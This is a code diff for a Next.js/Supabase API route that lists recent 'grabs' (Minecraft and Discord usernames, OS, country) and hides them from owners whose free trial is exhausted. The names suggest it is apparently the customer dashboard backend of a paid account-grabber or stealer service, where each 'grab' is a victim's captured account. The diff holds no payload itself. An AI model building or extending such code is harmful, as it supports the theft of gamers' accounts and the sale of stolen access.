@@ -1,13 +1,14 @@
 export const dynamic = 'force-dynamic';
 
-import { createServerClient } from '@supabase/ssr';
+import { createClient } from '@supabase/supabase-js';
 import { NextResponse } from 'next/server';
+import { getExhaustedEmails } from '@/lib/supabase/free-trial';
 
 function getClient() {
-  return createServerClient(
+  return createClient(
     process.env.NEXT_PUBLIC_SUPABASE_URL,
     process.env.SUPABASE_SERVICE_ROLE_KEY,
-    { cookies: { getAll() { return []; }, setAll() {} } }
+    { auth: { autoRefreshToken: false, persistSession: false } }
   );
 }
 
@@ -16,13 +17,18 @@ export async function GET() {
 
   const { data: grabs, error } = await supabase
     .from('grabs')
-    .select('minecraft_username, discord_username, created_at, updated_at, os, country')
+    .select('minecraft_username, discord_username, created_at, updated_at, os, country, owner_email')
     .order('created_at', { ascending: false })
     .limit(100);
 
   if (error) return NextResponse.json({ grabs: [], error: error.message });
 
-  const newGrabs = (grabs || []).filter(g => !g.updated_at || g.updated_at === g.created_at);
+  const exhaustedEmails = await getExhaustedEmails(supabase);
+
+  const newGrabs = (grabs || []).filter(g => {
+    if (g.updated_at && g.updated_at !== g.created_at) return true;
+    return !g.owner_email || !exhaustedEmails.includes(g.owner_email);
+  });
 
   const counts = {};
   for (const g of newGrabs) {
